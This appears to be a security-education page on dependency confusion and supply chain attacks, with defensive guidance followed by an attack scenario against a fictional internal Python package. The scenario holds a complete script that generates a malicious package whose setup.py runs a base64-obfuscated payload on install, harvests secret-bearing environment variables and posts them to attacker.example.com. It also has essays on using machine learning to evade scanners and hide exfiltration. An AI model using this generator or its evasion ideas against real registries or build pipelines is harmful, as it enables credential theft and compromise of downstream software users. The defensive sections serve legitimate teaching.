# Dependency Confusion / Supply Chain Attacks

> [!CAUTION]
> **Legal Disclaimer**: This document is for strictly educational and professional security research purposes. Unauthorized access to computer systems is illegal. The scripts provided are Proof-of-Concept (PoC) intended for use in controlled, lab environments. The author assumes no liability for misuse of this information.

---

## Table of Contents

1. [Overview Diagram](#overview-diagram)
2. [Introduction and Core Concepts](#introduction-and-core-concepts)
3. [Defense Principles](#defense-principles)
4. [Mitigation Strategies](#mitigation-strategies)
5. [Real-World Attack Scenarios](#real-world-attack-scenarios)
   - [Scenario 1: Dependency Confusion Attack](#scenario-1-dependency-confusion-attack)
   - [Scenario 2: Typosquatting Attack](#scenario-2-typosquatting-attack)
   - [Scenario 3: Compromised Maintainer Account](#scenario-3-compromised-maintainer-account)
   - [Scenario 4: Malicious Build Script in CI/CD](#scenario-4-malicious-build-script-in-cicd)

---

## Overview Diagram

```mermaid
flowchart TB
    subgraph AttackTypes["Supply Chain Attack Types"]
        DepConfusion["Dependency Confusion<br/>• Same name as internal pkg<br/>• Higher version number<br/>• Public registry priority"]
        Typosquatting["Typosquatting<br/>• Similar package names<br/>• Common misspellings<br/>• Visual lookalikes"]
        CompromisedPkg["Compromised Package<br/>• Hijacked maintainer account<br/>• Malicious update pushed<br/>• Legitimate package backdoored"]
        BuildAttack["Build System Attack<br/>• CI/CD pipeline injection<br/>• Build script manipulation<br/>• Artifact poisoning"]
        TransitiveDep["Transitive Dependency<br/>• Nested dependency attack<br/>• Deep supply chain<br/>• Hidden malicious code"]
    end

    subgraph AttackVectors["Attack Vectors & Entry Points"]
        NPM["npm Registry<br/>• Node.js packages<br/>• JavaScript ecosystem<br/>• Package.json targets"]
        PyPI["PyPI Registry<br/>• Python packages<br/>• pip installations<br/>• Requirements.txt"]
        Maven["Maven Central<br/>• Java artifacts<br/>• pom.xml targets<br/>• Gradle builds"]
        Docker["Container Images<br/>• Docker Hub<br/>• Base image poisoning<br/>• Layer injection"]
        GitHub["Source Repositories<br/>• GitHub/GitLab<br/>• Commit injection<br/>• PR manipulation"]
        CICD["CI/CD Pipelines<br/>• Jenkins/GitHub Actions<br/>• Build scripts<br/>• Deployment automation"]
    end

    subgraph AttackContexts["Attack Contexts"]
        PublicReg["Public Registries<br/>• Open package repos<br/>• No verification<br/>• Wide attack surface"]
        PrivateReg["Private Registries<br/>• Corporate repos<br/>• Internal packages<br/>• Namespace conflicts"]
        DevEnv["Development Environment<br/>• Developer machines<br/>• IDE plugins<br/>• Local builds"]
        Production["Production Systems<br/>• Deployed applications<br/>• Runtime dependencies<br/>• Container orchestration"]
    end

    subgraph DefenseMechanisms["Defense Mechanisms"]
        LockFiles["Lockfiles & Pinning<br/>• Version pinning<br/>• Hash verification<br/>• Reproducible builds"]
        PkgVerify["Package Verification<br/>• Signature checking<br/>• Checksum validation<br/>• Provenance attestation"]
        SBOM["SBOM Management<br/>• Dependency inventory<br/>• Vulnerability tracking<br/>• License compliance"]
        RegistryPol["Registry Policies<br/>• Namespace reservation<br/>• Private registry priority<br/>• Scope configuration"]
        SCA["Software Composition Analysis<br/>• Automated scanning<br/>• CVE detection<br/>• License auditing"]
        CodeSign["Code Signing<br/>• Artifact signatures<br/>• Build attestation<br/>• SLSA compliance"]
    end

    subgraph AttackImpact["Attack Impact"]
        CodeExec["Remote Code Execution<br/>• Arbitrary code running<br/>• System compromise<br/>• Privilege escalation"]
        DataTheft["Data Exfiltration<br/>• Credential theft<br/>• Source code leakage<br/>• Sensitive data access"]
        Backdoor["Backdoor Installation<br/>• Persistent access<br/>• C2 communication<br/>• Lateral movement"]
        ChainProp["Supply Chain Propagation<br/>• Downstream infection<br/>• Customer compromise<br/>• Ecosystem-wide impact"]
        CryptoMining["Cryptomining/Ransomware<br/>• Resource hijacking<br/>• Financial extortion<br/>• System disruption"]
        RepDamage["Reputation Damage<br/>• Trust erosion<br/>• Customer loss<br/>• Compliance violations"]
    end

    %% Attack Vector to Types
    NPM --> DepConfusion
    NPM --> Typosquatting
    NPM --> CompromisedPkg
    PyPI --> DepConfusion
    PyPI --> Typosquatting
    Maven --> CompromisedPkg
    Maven --> TransitiveDep
    Docker --> BuildAttack
    Docker --> CompromisedPkg
    GitHub --> BuildAttack
    GitHub --> CompromisedPkg
    CICD --> BuildAttack

    %% Attack Types to Contexts
    DepConfusion --> PrivateReg
    DepConfusion --> DevEnv
    Typosquatting --> PublicReg
    Typosquatting --> DevEnv
    CompromisedPkg --> PublicReg
    CompromisedPkg --> Production
    BuildAttack --> DevEnv
    BuildAttack --> Production
    TransitiveDep --> PublicReg
    TransitiveDep --> Production

    %% Contexts to Impact
    PublicReg --> CodeExec
    PublicReg --> ChainProp
    PrivateReg --> DataTheft
    PrivateReg --> Backdoor
    DevEnv --> DataTheft
    DevEnv --> CodeExec
    Production --> ChainProp
    Production --> CryptoMining

    %% Defense Connections
    LockFiles --> DepConfusion
    LockFiles --> CompromisedPkg
    PkgVerify --> Typosquatting
    PkgVerify --> CompromisedPkg
    SBOM --> TransitiveDep
    SBOM --> ChainProp
    RegistryPol --> DepConfusion
    RegistryPol --> PrivateReg
    SCA --> PublicReg
    SCA --> Production
    CodeSign --> BuildAttack
    CodeSign --> Production

    %% Defense Mitigation
    LockFiles -.->|Prevents| DepConfusion
    LockFiles -.->|Blocks| CompromisedPkg
    PkgVerify -.->|Detects| Typosquatting
    PkgVerify -.->|Validates| CompromisedPkg
    SBOM -.->|Tracks| TransitiveDep
    SBOM -.->|Monitors| ChainProp
    RegistryPol -.->|Isolates| DepConfusion
    RegistryPol -.->|Secures| PrivateReg
    SCA -.->|Scans| PublicReg
    SCA -.->|Protects| Production
    CodeSign -.->|Verifies| BuildAttack
    CodeSign -.->|Ensures| Production

    %% Styling
    classDef attackType fill:#ffcccc,stroke:#ff0000,stroke-width:3px,color:#000000
    classDef attackVector fill:#ffe6cc,stroke:#ff6600,stroke-width:2px,color:#000000
    classDef attackContext fill:#ccccff,stroke:#0000ff,stroke-width:2px,color:#000000
    classDef defense fill:#ccffcc,stroke:#00aa00,stroke-width:2px,color:#000000
    classDef impact fill:#ffccff,stroke:#aa00aa,stroke-width:2px,color:#000000

    class DepConfusion,Typosquatting,CompromisedPkg,BuildAttack,TransitiveDep attackType
    class NPM,PyPI,Maven,Docker,GitHub,CICD attackVector
    class PublicReg,PrivateReg,DevEnv,Production attackContext
    class LockFiles,PkgVerify,SBOM,RegistryPol,SCA,CodeSign defense
    class CodeExec,DataTheft,Backdoor,ChainProp,CryptoMining,RepDamage impact

    %% Subgraph styling
    style AttackTypes fill:#ffffff10,stroke:#ff0000,stroke-width:2px
    style AttackVectors fill:#ffffff10,stroke:#ff6600,stroke-width:2px
    style AttackContexts fill:#ffffff10,stroke:#0000ff,stroke-width:2px
    style DefenseMechanisms fill:#ffffff10,stroke:#00aa00,stroke-width:2px
    style AttackImpact fill:#ffffff10,stroke:#aa00aa,stroke-width:2px
```



### Legend

| Color | Category | Description |
|-------|----------|-------------|
| 🔴 Red Border | Attack Types | Different methods of supply chain compromise |
| 🟠 Orange Border | Attack Vectors | Entry points and package ecosystems targeted |
| 🔵 Blue Border | Attack Contexts | Environments where attacks manifest |
| 🟢 Green Border | Defense Mechanisms | Protection and detection controls |
| 🟣 Purple Border | Attack Impact | Consequences of successful attacks |

### Key Relationships

- **Solid arrows** (→): Show attack progression from vectors through types to impact
- **Dashed arrows** (-.->): Show how defenses prevent or mitigate specific attacks
- **Dependency Confusion** primarily targets organizations with private registries
- **Typosquatting** exploits developer errors in public package installations
- **Build System Attacks** affect both development and production environments
- **SBOM and SCA** provide visibility across the entire supply chain

---

## Introduction and Core Concepts

### Definition

**Dependency Confusion** (also known as **Namespace Confusion**) is a supply chain attack where an attacker uploads a malicious package to a public repository with the same name as an internal/private package used by a target organization. When the build system resolves dependencies, it may prefer the public package over the internal one due to version numbering or registry priority configurations.

**Supply Chain Attacks** more broadly encompass any attack that targets the software development and delivery pipeline, including compromising legitimate packages, injecting malicious code into build systems, or exploiting transitive dependencies.

### How the Attack Works

1. **Reconnaissance**: Attacker identifies internal package names used by target organization (via leaked code, job postings, error messages, or public repositories)

2. **Package Creation**: Attacker creates a malicious package in a public registry with:
   - The same name as the internal package
   - A higher version number to ensure priority
   - Malicious code in installation hooks (setup.py, postinstall scripts)

3. **Victim Installation**: When the victim's build system runs:
   - Package manager queries both public and private registries
   - Due to version priority or misconfiguration, the malicious public package is selected
   - Installation hooks execute attacker's code

4. **Payload Execution**: The malicious code runs with the privileges of the build/CI system:
   - Exfiltrates environment variables, secrets, and credentials
   - Establishes persistence or reverse shells
   - Injects additional backdoors into build artifacts

### Impact and Attack Vectors

| Attack Vector | Ecosystem | Risk Level | Common Targets |
|--------------|-----------|------------|----------------|
| **npm** | JavaScript/Node.js | Critical | Web applications, serverless functions |
| **PyPI** | Python | Critical | ML pipelines, automation scripts |
| **Maven/Gradle** | Java/Kotlin | High | Enterprise applications, Android apps |
| **NuGet** | .NET | High | Windows applications, Azure services |
| **RubyGems** | Ruby | High | Web applications, DevOps tools |
| **Docker Hub** | Containers | Critical | Microservices, cloud deployments |

### CWE and OWASP References

- **CWE-1357**: Reliance on Insufficiently Trustworthy Component
- **CWE-829**: Inclusion of Functionality from Untrusted Control Sphere
- **CWE-494**: Download of Code Without Integrity Check
- **OWASP A06:2021**: Vulnerable and Outdated Components

---

## Defense Principles

### Core Principles for Protection

1. **Trust Verification**
   - Never implicitly trust external packages
   - Verify package integrity through checksums and signatures
   - Validate package provenance before consumption

2. **Least Privilege**
   - Minimize permissions granted to build systems
   - Isolate build environments from production secrets
   - Use separate credentials for different pipeline stages

3. **Defense in Depth**
   - Implement multiple layers of security controls
   - Combine automated scanning with manual reviews
   - Use both preventive and detective controls

4. **Supply Chain Visibility**
   - Maintain complete inventory of all dependencies
   - Track transitive dependencies through SBOM
   - Monitor for new vulnerabilities continuously

5. **Isolation and Segmentation**
   - Separate internal packages from public namespaces
   - Use scoped packages and private registries
   - Implement network segmentation for build systems

### When and Where to Apply Defenses

| Defense Layer | When to Apply | Components Protected |
|--------------|---------------|---------------------|
| **Development** | Package installation, code reviews | Developer workstations, IDE plugins |
| **Build/CI** | Dependency resolution, artifact creation | CI/CD pipelines, build servers |
| **Registry** | Package publication, consumption | Package repositories, artifact storage |
| **Deployment** | Container builds, infrastructure provisioning | Production systems, cloud resources |
| **Runtime** | Application execution, dynamic loading | Running applications, microservices |

---

## Mitigation Strategies

### Primary Mitigation Techniques

#### 1. Namespace Reservation and Scoping

**Explanation**: Reserve your internal package names in public registries or use scoped/namespaced packages that cannot be confused.

- Register placeholder packages in public registries
- Use organization-scoped packages (e.g., `@company/package-name`)
- Configure package managers to require scopes for internal packages

#### 2. Registry Priority Configuration

**Explanation**: Configure package managers to always prefer private registries over public ones.

- Set private registry as the primary source
- Use `.npmrc`, `pip.conf`, or equivalent configuration
- Block direct access to public registries when not needed

#### 3. Version Pinning and Lockfiles

**Explanation**: Lock dependencies to specific, verified versions to prevent automatic updates to malicious versions.

- Use lockfiles (`package-lock.json`, `Pipfile.lock`, `poetry.lock`)
- Pin exact versions rather than ranges
- Commit lockfiles to version control

#### 4. Package Integrity Verification

**Explanation**: Verify cryptographic hashes and signatures of packages before installation.

- Enable hash verification in package managers
- Use `--require-hashes` flag with pip
- Verify GPG signatures on packages when available

### Alternative Approaches

#### Private Artifact Repository

Use solutions like JFrog Artifactory, Sonatype Nexus, or Azure Artifacts to:
- Proxy and cache external packages
- Apply security policies before consumption
- Maintain audit logs of all package access

#### Software Bill of Materials (SBOM)

Generate and consume SBOMs to:
- Track all dependencies including transitive ones
- Quickly identify affected systems when vulnerabilities emerge
- Meet compliance requirements (EO 14028)

#### Continuous Monitoring with SCA Tools

Deploy Software Composition Analysis tools:
- Snyk, Dependabot, OWASP Dependency-Check
- Automated vulnerability scanning in CI/CD
- Real-time alerts for compromised packages

### Implementation Considerations

| Consideration | Challenge | Solution |
|--------------|-----------|----------|
| **Developer Friction** | Additional configuration steps | Automate setup, provide clear documentation |
| **Build Performance** | Extra verification adds time | Cache verified packages, parallel scanning |
| **False Positives** | Legitimate packages flagged | Tune thresholds, maintain allowlists |
| **Legacy Systems** | Old package managers lack features | Gradual migration, wrapper scripts |
| **Supply Chain Depth** | Transitive dependencies hard to track | SBOM generation, deep scanning |

---

## Real-World Attack Scenarios

### Scenario 1: Dependency Confusion Attack

A threat actor discovers that a major financial services company uses an internal Python package named `internal-auth-utils`. The attacker uploads a malicious version to PyPI with a higher version number, causing the company's CI/CD pipeline to install the malicious public package instead of the internal one.

#### Attack Flow

1. **Reconnaissance**: Attacker finds package name in leaked requirements.txt or GitHub commit
2. **Malicious Package Creation**: Creates `internal-auth-utils` on PyPI with version 99.0.0
3. **Installation Hook Injection**: Adds malicious code to `setup.py` that runs during installation
4. **CI/CD Trigger**: Company's automated build pulls the "newer" public version
5. **Code Execution**: Malicious setup.py exfiltrates environment variables and secrets
6. **Persistence**: Backdoor remains in cached packages for future builds

#### Attack Workflow Diagram


#### Reconnaissance Tools and Weaponization Code

**Reconnaissance (Information Gathering)**

| Tool | Feature/Flag | Purpose |
|------|-------------|---------|
| **GitHub Search** | `filename:requirements.txt` | Search for exposed dependency files in public repositories that may contain internal package names |
| **Shodan** | `http.html:"ModuleNotFoundError"` | Find error pages exposing internal module names in stack traces |
| **theHarvester** | `-d domain.com -b all` | Gather subdomains and email patterns that may reveal internal naming conventions |
| **GitLeaks** | `--repo-path ./` | Scan for accidentally committed dependency manifests with internal package references |

**GitHub Search** with the `filename:requirements.txt org:company-name` query is critical because developers frequently expose internal package names when committing dependency files to public repositories or forks. This reveals naming patterns and version constraints used internally.

**Weaponization (Python Script)**

```python
#!/usr/bin/env python3
"""
Dependency Confusion Attack - Malicious Package Generator
Educational PoC for demonstrating supply chain vulnerabilities
"""

import os
import json
import base64
from pathlib import Path

# Configuration for the malicious package
# These values would be customized per-target
PACKAGE_NAME = "internal-auth-utils"  # Name matching internal package
MALICIOUS_VERSION = "99.0.0"  # High version to ensure priority
EXFIL_ENDPOINT = "https://attacker.example.com/collect"  # C2 server

def generate_malicious_setup_py():
    """
    Generate a malicious setup.py that executes during package installation.
    The payload runs in the install phase before any security scanning.
    Uses base64 encoding to evade simple string-matching detection.
    """
    
    # The exfiltration payload - collects sensitive environment data
    # Base64 encoded to bypass basic static analysis
    payload_code = '''
import os
import json
import socket
import urllib.request

# Collect sensitive environment variables
# CI/CD systems often expose secrets via env vars
sensitive_vars = {}
target_patterns = ["API", "KEY", "SECRET", "TOKEN", "PASSWORD", "AWS", "AZURE"]

for key, value in os.environ.items():
    # Check if variable name matches sensitive patterns
    if any(pattern in key.upper() for pattern in target_patterns):
        sensitive_vars[key] = value

# Gather system information for fingerprinting
system_info = {
    "hostname": socket.gethostname(),
    "cwd": os.getcwd(),
    "user": os.environ.get("USER", "unknown"),
    "ci_system": os.environ.get("CI", "unknown")
}

# Combine collected data
exfil_data = {
    "secrets": sensitive_vars,
    "system": system_info
}

# Exfiltrate via HTTP POST to attacker-controlled server
# In real attacks, DNS exfiltration is often used to bypass firewalls
try:
    req = urllib.request.Request(
        "''' + EXFIL_ENDPOINT + '''",
        data=json.dumps(exfil_data).encode(),
        headers={"Content-Type": "application/json"}
    )
    urllib.request.urlopen(req, timeout=5)
except:
    pass  # Silent failure to avoid detection
'''
    
    # Encode payload to evade basic detection
    encoded_payload = base64.b64encode(payload_code.encode()).decode()
    
    # Generate the setup.py that decodes and executes the payload
    setup_content = f'''
from setuptools import setup
import base64
import sys

# Decode and execute payload during installation
# This runs with the privileges of the build system
exec(base64.b64decode("{encoded_payload}").decode())

setup(
    name="{PACKAGE_NAME}",
    version="{MALICIOUS_VERSION}",
    description="Internal authentication utilities",
    author="Legitimate Author",
    packages=["{PACKAGE_NAME.replace("-", "_")}"],
    python_requires=">=3.6",
)
'''
    return setup_content


def create_package_structure():
    """
    Create the complete malicious package structure.
    Mimics a legitimate package to avoid suspicion.
    Includes empty module to satisfy import requirements.
    """
    
    # Create package directory structure
    pkg_dir = Path(PACKAGE_NAME)
    pkg_dir.mkdir(exist_ok=True)
    
    # Create the Python module directory
    module_dir = pkg_dir / PACKAGE_NAME.replace("-", "_")
    module_dir.mkdir(exist_ok=True)
    
    # Create __init__.py with benign-looking code
    # This ensures the package is importable after installation
    init_content = '''
"""Internal authentication utilities."""
__version__ = "99.0.0"

def authenticate(user, password):
    """Placeholder authentication function."""
    return True
'''
    (module_dir / "__init__.py").write_text(init_content)
    
    # Write the malicious setup.py
    (pkg_dir / "setup.py").write_text(generate_malicious_setup_py())
    
    # Create README for legitimacy
    (pkg_dir / "README.md").write_text(f"# {PACKAGE_NAME}\nInternal utilities.")
    
    print(f"[+] Malicious package created in ./{PACKAGE_NAME}/")
    print(f"[+] Upload with: cd {PACKAGE_NAME} && python setup.py sdist upload")


if __name__ == "__main__":
    create_package_structure()
```

#### AI-ML-Enhanced Attack Techniques

**1. Automated Internal Package Name Discovery using NLP**

Large Language Models can be trained to identify internal package naming patterns by analyzing publicly available code repositories, job postings, and technical blog posts from target organizations. By fine-tuning a transformer model like BERT or GPT on a corpus of package names from various ecosystems, the model learns semantic patterns that distinguish internal packages from public ones. The model can identify naming conventions such as company prefixes, project codenames, and internal abbreviations that are unlikely to exist in public registries. Natural Language Processing techniques can extract package references from unstructured text sources like Stack Overflow questions, GitHub issues, and developer forum discussions where employees may inadvertently mention internal tooling. The trained model can then generate candidate package names with high probability of matching actual internal packages based on learned patterns. This approach dramatically increases reconnaissance efficiency by reducing manual analysis time from weeks to hours. The model can also rank discovered candidates by likelihood of being internal packages, allowing attackers to prioritize targets. Integration with automated OSINT pipelines enables continuous monitoring for newly exposed internal package references.

**2. Adversarial ML for Evading Package Security Scanners**

Generative Adversarial Networks (GANs) can be employed to create malicious payloads that evade static analysis and signature-based detection systems used by package registries. The generator network learns to produce obfuscated code that maintains malicious functionality while appearing benign to security scanners trained on known malware patterns. By training on datasets of flagged malicious packages and their detection signatures, the discriminator component models how security tools classify code as suspicious. The generator then iteratively refines obfuscation techniques to minimize detection probability while preserving payload functionality. Reinforcement Learning can further optimize payload generation by rewarding variants that successfully bypass multiple security tools. Techniques include semantic-preserving code transformations, variable renaming using contextually appropriate identifiers, and control flow obfuscation that breaks signature patterns. The GAN architecture can also learn to mimic coding styles of legitimate package maintainers to pass manual code review. This approach represents a significant escalation in the arms race between attackers and package security systems, requiring defenders to adopt similarly sophisticated ML-based detection.

**3. Predictive Targeting using Graph Neural Networks**

Graph Neural Networks (GNNs) can model the complex dependency relationships in software ecosystems to identify high-value targets for dependency confusion attacks. By constructing a knowledge graph of package dependencies, organizational relationships, and software supply chains, GNNs can propagate information through the network to identify packages with maximum downstream impact. The model considers factors such as the number of dependent packages, the criticality of dependent applications, and the security posture of consuming organizations. Temporal analysis of dependency graph evolution helps predict when organizations are likely to update dependencies, creating optimal attack timing windows. The GNN can identify transitive dependency paths that would cause a malicious package to propagate through multiple organizational boundaries. Link prediction capabilities enable forecasting of future dependencies, allowing proactive package name squatting before internal packages are published. Attention mechanisms in the GNN architecture highlight the most influential nodes in the supply chain graph. This sophisticated targeting maximizes attack impact while minimizing detection risk through strategic package placement.

**4. Intelligent C2 Communication using Reinforcement Learning**

Reinforcement Learning agents can optimize command-and-control communication patterns to evade network-based detection systems deployed in enterprise environments. The RL agent learns to adaptively select exfiltration channels (DNS, HTTP, ICMP) based on observed network policies and security tool responses. By modeling the environment as a Markov Decision Process, the agent balances the trade-off between data exfiltration speed and detection avoidance. The reward function penalizes detected communications and rewards successful secret extraction, driving the agent toward stealthy behavior patterns. Transfer learning enables the agent to quickly adapt to new target environments by leveraging knowledge gained from previous deployments. The agent can dynamically adjust timing, payload size, and encoding schemes based on real-time feedback from the compromised system. Multi-agent RL approaches coordinate exfiltration across multiple compromised hosts to distribute traffic and avoid pattern detection. This adaptive approach significantly increases the window of opportunity for data theft before security teams detect and respond to the compromise.

#### Mitigation Strategy Diagram


---

